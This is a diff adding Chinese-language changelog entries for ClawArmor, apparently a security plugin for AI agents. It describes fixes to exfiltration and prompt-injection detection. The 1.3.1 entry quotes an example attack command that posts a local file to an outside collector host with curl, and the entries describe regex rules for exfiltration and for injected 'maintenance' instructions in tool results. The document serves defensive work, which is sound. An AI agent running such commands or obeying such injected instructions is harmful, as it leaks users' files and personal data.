@@ -1,5 +1,150 @@
 # ClawArmor 变更日志
 
+## [1.3.1] - 2026-04-10 ✅ 单元测试 23/23 通过
+
+### 修复（数据外泄防护三连 Bug）
+
+**Bug 1：`curl-post` Sink 正则不匹配 URL-first 写法（最致命）**
+- 旧正则：`curl\s+(?:-[A-Z]\s+)*-[dD]\s+` → 只匹配 `curl -d data URL`，不匹配 `curl URL -d data`
+- 实际攻击命令：`curl https://unknown-collector.com/report -d @/tmp/file` → **完全不命中**
+- 修复：重写为 `\bcurl\b[^|;&]{0,400}-[dD]\b/s`，URL 前后顺序均可匹配
+- 额外新增 `curl-external` sink 信号：匹配任何 exec 内 curl 访问非本地 HTTP(S) 地址
+
+**Bug 2：PII 检测结果未接入外泄链 source 信号**
+- 旧逻辑：工具结果 PII 检测 → 只存 `runtimeFlags["pii-in-tool:..."]`，不更新 `exfilStates.sourceSignals`
+- 结果：后续 exec+curl 调用时 `priorSourceSignals = []`，`evaluateExfiltrationGuard` 无 source → 不触发
+- 修复：在 `afterToolCall` PII 检测后同步追加 `exfilStates.sourceSignals["pii-source:{toolName}"]`，接通 source→sink 链
+
+**Bug 3：exec+curl 绕过 outbound 工具检测（根本防线缺失）**
+- 根本原因：`isOutboundTool()` 仅匹配 `curl|wget|http_request|web_fetch`，`exec` 不在列表中
+- 结果：Agent 用 `exec` 运行 curl 时，`checkDataFlowConfidentiality`（Slow Path）从不触发
+- 修复：在 `DANGEROUS_COMMAND_PATTERNS` 新增两条规则，走 `commandBlock`（enforce 模式）进行强制拦截：
+  - `exec-curl-data-exfil`：检测 exec 内 curl 向外部地址 POST 数据（使用 lookahead 确认同时含 `-d` 标志和非本地 URL）
+  - `exec-wget-post-exfil`：检测 exec 内 wget `--post-data/file` 外发
+
+### 新增（外泄链 source 信号扩展）
+
+`EXFIL_SOURCE_SIGNALS` 新增两个通用 source 信号：
+- `read-local-file`：任何本地路径的读取操作（`read /path/file`、`cat ~/file` 等）
+- `file-ref-param`：curl/wget 参数中的 `@/path` 本地文件引用（如 `-d @/tmp/data.txt`）
+
+### 诊断增强
+
+- `before_prompt_build` 新增 INFO 级别诊断日志，记录 `hasTurnSignals`、`injectionFlags`、`isToolResultSuspicious`、`runtimeFlags`，用于确认钩子是否触发及当前累计的风险信号
+- `buildSyntheticPlanContext` 现将 `pii-in-tool` 标记单独作为数据外泄风险信号纳入 LLM 检查上下文（而非前版的全部过滤），使意图对齐模型能感知到 PII 数据已被访问的风险
+
+---
+
+## [1.3.0] - 2026-04-10
+
+### 架构升级：Fast Path → Slow Path 双层联动
+
+重构 `before_prompt_build` 钩子的意图对齐触发逻辑，实现规则引擎先行过滤、LLM 精检兜底的完整闭环：
+
+**旧逻辑**：只有当 OpenClaw 在事件中携带 `plan` / `planText` 字段时才触发 LLM，否则 Slow Path 永远不介入
+
+**新逻辑**（四步流水线）：
+1. **Fast Path 优先**：`before_tool_call` / `after_tool_call` / `agent_start` 已将本轮风险信号累积到 `TurnSignals`；若上游 Fast Path 已 block，流程不会到达此钩子
+2. **确定 LLM 输入**：优先使用 OpenClaw 传入的显式 `plan`/`planText`；无显式 plan 时从 `TurnSignals` 风险信号合成摘要（注入信号、可疑工具返回、Skill 风险、外部数据源）
+3. **Slow Path 触发条件**：有显式 plan 或有任意 Fast Path 风险信号 → 触发 LLM 意图对齐；本轮完全干净（零风险信号且无 plan）→ 跳过 LLM，零额外开销
+4. **注入安全提示词**：无论是否触发 LLM，均将安全上下文前置到系统提示词
+
+### 新增
+
+- **`buildSyntheticPlanContext()`** 辅助函数：将 `TurnSignals` 中的风险信号转化为自然语言摘要，作为无 plan 时 LLM 的检查上下文
+  - 过滤 `pii-in-*` 标记（属于 PII 脱敏，非意图劫持信号）
+  - 零风险信号返回 `null` 跳过 LLM
+
+### 效果
+
+- **T4.1 场景**：Fast Path 检测到 `exec-prefix-inject`，`buildSyntheticPlanContext` 生成摘要，`before_prompt_build` 触发 LLM 做意图对齐二次验证
+- **S8.2 场景**：用户输入社工风险被 Fast Path 标记为 `injectionFlags`，同样触发 LLM 验证
+- **干净场景**（无攻击）：零风险信号 + 无 plan → 跳过 LLM，延迟为零
+
+---
+
+## [1.2.9] - 2026-04-10
+
+### 修复
+
+- **日志 meta 被 OpenClaw 静默丢弃**：`fromAegisLogger` 桥接传输器调用 `aegisLogger.info(message, meta)` 时，OpenClaw 的 `api.logger` 只写 `message` 字符串，`meta` 对象从不出现在 gateway.log 中
+  - 根本原因：OpenClaw 内部日志实现只接受单字符串参数，第二个参数被忽略
+  - 修复：新增 `buildMessageWithMeta()` 函数，在 `bridgeTransport.write()` 内将所有非空 meta 字段序列化为紧凑 JSON，追加到 message 字符串后（格式：`消息文本 | {"key":"value",...}`）
+  - 长文本字段（`systemPrompt`、`userContent`、`response`、`stack`）自动截断至 200 字符，避免单行过长
+  - 效果：所有 `[ClawArmor]` 日志行（含 Slow Path 模型调用开始/响应完成、工具调用诊断、注入检测告警）现在均在 gateway.log 中携带完整结构化字段
+
+---
+
+## [1.2.8] - 2026-04-10
+
+### 新增
+
+- **Slow Path 全链路日志**：`ModelGateway.safeVerify()` 新增三档日志，覆盖 Ollama 和 OpenAI 兼容（DeepSeek）两种 provider
+  - **调用开始**（INFO）：`[ClawArmor][SlowPath] 模型调用开始`，记录 `checker`（检查器名）、`provider`、`model`、`maxTokens`、`systemPromptLength`、`systemPrompt`（前 300 字符）、`userContentLength`、`userContent`（前 800 字符）
+  - **响应完成**（INFO）：`[ClawArmor][SlowPath] 模型响应完成`，记录 `checker`、`provider`、`model`（取自响应）、`latencyMs`、`responseLength`、`response`（前 1000 字符）
+  - **调用失败**（WARN）：`[ClawArmor][SlowPath] 模型调用失败，fail-open`，记录 `checker`、`provider`、`model`、`error`（异常消息）
+- **检查器标识透传**：三个检查器（`intent-alignment`、`data-flow`、`control-flow`）调用 `safeVerify` 时各自传入 `label` 参数，日志中可直接区分是哪个检查器在调用
+
+### 修复
+
+- **DeepSeek 配置错误**：`claw-armor.config.json` 中 `openaiCompat.apiKeyEnvVar` 误填了 API Key 值（应填环境变量名），已将 Key 移至正确字段 `apiKey`；`baseUrl` 缺少 `/v1` 后缀（`https://api.deepseek.com` → `https://api.deepseek.com/v1`），已修正，确保 `/chat/completions` 路径正确拼接
+
+---
+
+## [1.2.7] - 2026-04-10
+
+### 修复
+
+- **`fake-maintenance-cn` 正则漏判**：将关键词间匹配从 `\s*` 改为 `.{0,10}`，支持 `--- 系统自动维护模块 ---`（`自动维护` 夹在 `系统` 和 `模块` 之间）
+  - 根本原因：原正则要求两个关键词（`系统`/`自动`/`维护`…）直接相邻，无法覆盖中间插词的情形
+- **`social-exec-cn` 正则漏判**：将目标词前匹配从 `(?:以下|如下|下列)?` 后直接跟目标词，改为允许 `.{0,5}` 间隔，覆盖 `请执行以下维护指令` 中 `维护` 插在 `以下` 和 `指令` 之间的场景
+
+### 新增
+
+- **`checkAndNeutralizeInjection` 同步净化方法**：在 `tool_result_persist` hook（确认可靠触发的同步钩子）中，对每条工具返回结果执行嵌入式执行注入扫描，检测到 `EMBEDDED_EXEC_PATTERNS` 后逐行替换为 `[ClawArmor 已屏蔽可疑指令]`，防止 LLM 下一轮看到注入内容
+  - 不依赖 `after_tool_call` 异步 hook（该 hook 是否触发取决于框架版本），改为在 `tool_result_persist` 同步路径中执行
+  - 与 PII 脱敏串联：先净化注入指令，再执行 PII/凭证脱敏，两步处理后写入 transcript
+
+### 诊断增强
+
+- **`beforeToolCall` INFO 日志**：新增 `[ClawArmor] 工具调用前检查` INFO 级别日志，用于确认 `before_tool_call` 钩子是否被 OpenClaw 框架正确触发（之前仅有 DEBUG 级别，被日志过滤屏蔽）
+- **`afterToolCall` INFO 日志**：新增 `[ClawArmor] 工具返回扫描` INFO 级别日志，用于确认 `after_tool_call` 钩子触发并携带正确内容
+
+---
+
+## [1.2.6] - 2026-04-09
+
+### 修复
+
+- **OllamaAdapter URL/模型名规范化**：修复 `baseUrl` 以 `/v1` 结尾时 `isAvailable()` 和 `verify()` 调用原生 Ollama API 路径错误的问题
+  - 根本原因：用户按 OpenAI-compat 格式配置 `baseUrl`（`http://localhost:11434/v1`），但 OllamaAdapter 直接拼接 `/api/tags` 和 `/api/chat`，导致实际请求 `http://localhost:11434/v1/api/tags`（路径错误）
+  - 修复方式：构造时自动剥离 `/v1` 后缀，规范化为 Ollama 原生 API 根路径
+  - 同时处理 `model` 字段的 `ollama/` 前缀（如 `ollama/qwen2.5:0.5b` → `qwen2.5:0.5b`），确保与原生 API 兼容
+
+### 新增
+
+- **Slow Path 真实模型集成测试**（`tests/engine-slow/slow-engine-real.test.ts`）：23 个测试用例，使用本地 Ollama `qwen2.5:0.5b` 验证：
+  - ModelGateway 连通性（isAvailable / safeVerify）
+  - 数据流熔断 Fast-path 正则阻断（手机号/身份证/API Key + 不可信域名）
+  - 数据流熔断受信白名单放行（api.openai.com / github.com）
+  - 意图对齐真实模型推理（safe 场景验证 + 响应格式健壮性）
+  - 控制流完整性真实模型调用
+  - Slow Path fail-open 机制（模型不可达时不影响业务）
+- **manual-test-guide.md 新增测试区域 S8**（Slow Path 本地模型增强防御）：8 个人工测试场景，涵盖 Ollama 连通性验证、数据流熔断、受信白名单、意图对齐、fail-open 行为、污点追踪联动
+
+---
+
+## [1.2.5] - 2026-04-09
+
+### 修复
+
+- **`openclaw-dir` 误拦截 skills/ 路径**：将受保护子目录从 `plugins|extensions|agents|skills|tasks` 精简为 `plugins|extensions|agents`
+  - 根本原因：`skills/` 是 Agent 能力库，插件/Skill 脚本需要被正常读取和执行；将其纳入保护导致 Agent 无法读取自身技能（如 `clawra-selfie.sh`），功能完全失效
+  - 修复后：`plugins/`（安全插件代码）、`extensions/`（扩展代码）、`agents/`（会话/人格数据）继续受保护；`skills/`、`tasks/`、`media/`、`workspace/` 等运行目录不再拦截
+  - 影响场景：调用 `给我一个自拍` 等需要读取 skill 脚本的请求之前被 `before_tool_call` 拦截，修复后可正常执行
+
+---
+
 ## [1.2.4] - 2026-04-09
 
 ### 修复
